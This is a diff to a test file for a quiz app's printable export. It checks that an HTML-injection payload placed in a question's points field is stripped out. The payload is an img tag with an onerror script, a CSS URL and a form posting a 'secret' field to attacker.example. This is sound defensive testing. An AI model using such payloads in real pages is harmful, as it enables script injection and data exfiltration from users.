@@ -658,7 +658,7 @@ describe("ManageTab bulk and duplicate actions", () => {
           options: null,
           correct_answer: "true",
           explanation: "",
-          points: '</p><img src=x onerror="globalThis.__quizXss=1">' as any,
+          points: '</p><img data-quiz-marker="unsafe-image" src="https://attacker.example/track" onerror="globalThis.__quizXss=1"><style data-quiz-marker="unsafe-style">body{background-image:url(https://attacker.example/background)}</style><form data-quiz-marker="unsafe-form" action="https://attacker.example/submit"><input name="secret"></form><p>' as any,
           order_index: 0,
           deleted: false,
           client_id: "test",
@@ -705,8 +705,13 @@ describe("ManageTab bulk and duplicate actions", () => {
     expect(writtenHtml).toContain("<title>Quiz A - Printable Quiz</title>")
     expect(writtenHtml).toContain("<style>")
     expect(writtenHtml).toContain("<body>")
+    expect(writtenHtml).toContain("Points: 0")
     expect(writtenHtml).not.toContain("onerror")
     expect(writtenHtml).not.toContain("__quizXss")
+    expect(writtenHtml).not.toContain("data-quiz-marker")
+    expect(writtenHtml).not.toContain("attacker.example")
+    expect(writtenHtml).not.toContain("<img")
+    expect(writtenHtml).not.toContain("<form")
 
     openSpy.mockRestore()
   }, 20000)
